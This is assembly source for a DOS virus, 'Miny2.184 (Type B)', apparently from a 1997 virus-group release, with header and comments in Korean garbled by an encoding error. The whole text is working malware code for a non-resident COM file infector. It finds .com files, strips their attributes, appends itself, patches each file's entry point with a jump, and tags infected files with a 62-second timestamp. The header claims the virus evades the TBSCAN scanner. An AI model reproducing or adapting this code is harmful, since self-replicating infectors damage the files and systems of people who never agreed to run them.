;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.184 (Type B)
; Author : Osiris
; Group : CVC
; Date : 1997/08/17
;
; Type : Non-resident COM infector
;
; Miny2 (Type A) �� �����e���a. �����A��e A �w�� �a���� ���� �A��i���� ��
; �� ��˥�i �a�a�v�a. �� ���A�� �a�e �����e �����i ����/�a���� �a����
; �A�ᯡ (���� �i��ϡ ���a�a�a �a�� �q���E �wȁ) �១�a�e �������a.
;
; �a�q���e COM �¸w�a�i �a�� EXE �a���i �q�q��ǡ�� �g�e ���i �奡���V�a.
; (��:DOS 7.0 �� COMMAND.COM)
;
; �a��ӡ �a�q�� �{�e ���A�� �����e�a.
;
; 1. TBSCAN �� �������w�A �񬂖E�a.
; 2. COM �¸w�a�i �a�� EXE �a���i �q�q��ǥ�a.
;
;
;
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; �a�A���t (�a������ �e�e�a.)
            nop                         ; �|���� ������ �a����a�a �a�A�A��
            nop                         ; �����A �� �t�i �����a.
 start:
            call  Next                  ;
 Next:      pop   bp                    ;
            sub   bp,offset Next        ; BP = �a����a ���b����

            lea   si,COM_head[BP]       ;
            mov   di,100h               ; COM �� �|�����i �����e�a.
            push  di                    ;
            movsw                       ;
            movsb                       ;

            mov   cx,0080h              ; DTA �� �a�wЁ PSP �a �a�A�A�a��
            mov   si,0080h              ; �q�� ��w�e�a.
            lea   di,End_Virus[BP]      ;
            repz  movsb                 ;

            mov   ah,4Eh                ; �a�� �x��
            mov   cx,00100011B
            lea   dx,Match_COM[BP]
 Find:      int   21h
            jnc   ChkInfected           ;
 Restart:
            lea   si,End_Virus[BP]      ; ���� DTA ����
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET

 ChkInfected:                           ; �q�q �a���i �·��e�a.
            mov   al,DS:[0096h]         ; 62 �� ���� ��a�e�a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
            mov   ah,4Fh                ; �a�q �a�� �x��
            jmp   Find
 Infect:
            mov   ax,4301h              ; ����/�a�� �����a�� �a��
            xor   cx,cx
            mov   dx,009Eh
            int   21h
            jc    Restart               ; �A�ᯡ DTA ����ҁ ���a

            mov   ax,3D02h              ; �a�� ���e
            int   21h

            xchg  ax,bx                 ; �a�� Ѕ�i �苡

            mov   ax,5700h              ; �a�� �b�� ���e �苡
            int   21h
            push  cx                    ; �b�� ���e ��w
            push  dx                    ;

            mov   ah,3Fh                ; �|���� ����
            lea   dx,COM_Head[BP]       ; ���� ����
            mov   cx,0003               ; 3 �a���a
            int   21h

            mov   al,02                 ; �a�� �{�a�� ����
            call  lseek

            sub   ax,3                  ; ���a�t ���e
            mov   word ptr JumpCode[BP+1],ax     ;

            mov   ah,40h                ; �a����a �a��
            mov   cx,offset End_virus - 3 - 2
            lea   dx,start[BP]
            int   21h

            mov   al,00                 ; ��q�a�� ����
            call  lseek

            mov   ah,40h                ; ���a š�a �a��
            mov   cx,0003
            lea   dx,JumpCode[BP]
            int   21h

            pop   dx                    ; �a�� �b�� ���e ����
            pop   cx                    ;
            or    cx,+1Fh               ; 62 ���� �e�i��
            mov   ax,5701h              ;
            int   21h

 Close:
            mov   ah,3Eh                ; �a�� �h��
            int   21h
            jmp   Restart

 lseek:                                 ;
            xor   cx,cx
            xor   dx,dx
            mov   ah,42h
            int   21h
            ret

 COM_head   db    0CDh,20h,90h          ; COM �|����
 Match_COM  db    '*.com',00            ; COM �a�� �x��
            db    'Miny2'               ; ���� 2
 JumpCode   db    0E9h
            db    ?,?
 End_Virus:
            END   Miny2

